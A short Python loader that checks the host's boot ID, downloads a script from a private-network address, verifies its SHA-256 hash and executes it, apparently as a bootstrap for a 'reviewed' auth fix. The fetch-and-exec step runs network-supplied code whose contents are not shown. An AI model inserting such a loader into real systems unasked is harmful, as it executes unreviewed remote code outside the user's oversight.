import hashlib,urllib.request
from pathlib import Path
assert Path('/proc/sys/kernel/random/boot_id').read_text().strip()=='b0718166-5c3b-4c4f-b669-4f83d3340d00'
b=urllib.request.urlopen('http://192.168.2.1:8765/start2.py',timeout=15).read(65536)
assert hashlib.sha256(b).hexdigest()=='7fe89f97f7d0a94f72d5985d9ec5927293f2a3b43188d25d929b4d489207c730'
exec(compile(b,'reviewed_authfix_start2','exec'))
